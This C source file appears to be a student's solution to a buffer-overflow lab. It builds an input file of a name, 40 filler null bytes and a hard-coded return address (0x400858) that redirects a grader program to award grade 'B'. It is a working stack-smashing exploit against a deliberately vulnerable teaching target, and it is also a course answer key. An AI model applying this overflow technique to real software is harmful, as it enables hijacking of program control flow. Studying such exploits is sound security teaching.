/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Jiatong Yu                                                 */
/*--------------------------------------------------------------------*/

#include <stdio.h>

/* main function writes to the file dataB name and filler, and corresponding
address to overrun the grader file */
int main(void) {
    int i;
    unsigned long ulAddress;
    FILE* psFile;
    psFile = fopen("dataB","w");

    /* write my name into file */
    fprintf(psFile, "jiatongy");
    /* write 40 null bytes into file to the end of buf */
    /* 40 is a magic number that represent the remaining chars inside buf to be filled*/
    for(i = 0; i < 40; i++) {
        putc('\0', psFile);
    }

    /* put the address of grade = 'B' into stack */
    /* 0x400858 */
    ulAddress = 0x400858;
    fwrite(&ulAddress, sizeof(unsigned long), 1, psFile);

    fclose(psFile);

    return 1;

}


